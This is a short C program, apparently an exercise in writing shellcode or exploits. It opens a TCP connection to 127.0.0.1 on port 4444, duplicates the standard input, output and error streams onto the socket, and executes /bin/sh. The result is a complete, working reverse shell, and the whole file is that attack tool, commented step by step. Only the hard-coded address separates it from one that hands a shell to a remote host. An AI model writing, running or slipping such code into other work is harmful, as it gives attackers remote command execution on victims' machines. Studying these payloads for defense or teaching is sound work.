#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main ()
{
    /* Create a TCP Socket */
    int sockfd = socket(AF_INET, SOCK_STREAM, 0); 

    /* Create an IP Address Pointer */
    const char* ip = "127.0.0.1";
    
    /* Create an IP Socket Address Structure */
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_aton(ip, &addr.sin_addr);

    /* Connect TCP Socket to IP Socket Address Structure */
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    /* Direct Connection Socket Output */
    for (int i = 0; i < 3; i++)
    {   
        dup2(sockfd, i); 
    }   

    /* Execute Program */
    execve("/bin/sh", NULL, NULL);
    return 0;
}
